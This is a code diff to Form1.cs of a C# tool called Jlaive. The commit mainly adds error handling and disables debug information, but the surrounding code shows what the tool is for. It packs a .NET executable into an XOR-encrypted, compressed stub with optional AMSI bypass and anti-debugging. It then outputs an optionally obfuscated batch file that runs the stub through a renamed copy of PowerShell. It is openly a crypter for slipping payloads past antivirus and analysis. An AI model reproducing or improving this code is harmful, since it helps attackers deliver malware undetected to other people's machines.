Disable IncludeDebugInformation

+++ Jlaive/Form1.cs
@@ -1,6 +1,8 @@
 ﻿using System;
 using System.CodeDom.Compiler;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Text;
 using System.Windows.Forms;
 using Microsoft.CSharp;
@@ -16,7 +18,7 @@ namespace Jlaive
             InitializeComponent();
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private void openButton_Click(object sender, EventArgs e)
         {
             OpenFileDialog ofd = new OpenFileDialog();
             ofd.RestoreDirectory = true;
@@ -24,36 +26,50 @@ namespace Jlaive
             textBox1.Text = ofd.FileName;
         }
 
-        private void button2_Click(object sender, EventArgs e)
+        private void buildButton_Click(object sender, EventArgs e)
         {
+            buildButton.Enabled = false;
             string path = textBox1.Text;
-            byte[] pbytes = File.ReadAllBytes(path);
-
-            Random rng = new Random();
-            string stub;
-            if (IsAssembly(path)) stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
-            else
+            if (!File.Exists(path))
+            {
+                MessageBox.Show("Invalid input file path!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                buildButton.Enabled = true;
+                return;
+            }  
+            if (!IsAssembly(path))
             {
                 MessageBox.Show("Input file not valid assembly!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                buildButton.Enabled = true;
                 return;
             }
 
+            Random rng = new Random();
+
+            byte[] pbytes = File.ReadAllBytes(path);
+            string stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
             string tempfile = Path.GetTempFileName();
             CSharpCodeProvider csc = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
             {
                 GenerateExecutable = true,
                 CompilerOptions = "/optimize",
-                IncludeDebugInformation = true
+                IncludeDebugInformation = false
             };
-            csc.CompileAssemblyFromSource(parameters, stub);
+            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
+            if (results.Errors.Count > 0)
+            {
+                List<string> errors = new List<string>();
+                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
+                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                buildButton.Enabled = true;
+                return;
+            }
             byte[] stubbytes = File.ReadAllBytes(tempfile);
             File.Delete(tempfile);
 
             string key = RandomString(20, rng);
             byte[] encrypted = XORCrypt(Compress(stubbytes), key);
             string command = StubGen.CreatePS(key, rng);
-
             StringBuilder toobf = new StringBuilder();
             toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
             toobf.AppendLine("cls");
@@ -67,7 +83,6 @@ namespace Jlaive
             }
             else toobf.AppendLine(command);
             toobf.Append("del pshell.exe");
-
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
             if (obfuscate.Checked) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
@@ -78,7 +93,9 @@ namespace Jlaive
 
             string outputpath = Path.ChangeExtension(path, "bat");
             File.WriteAllText(outputpath, output.ToString(), Encoding.ASCII);
+
             MessageBox.Show($"Build successful!\nOutput path: {outputpath}", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            buildButton.Enabled = true;
         }
     }
 }
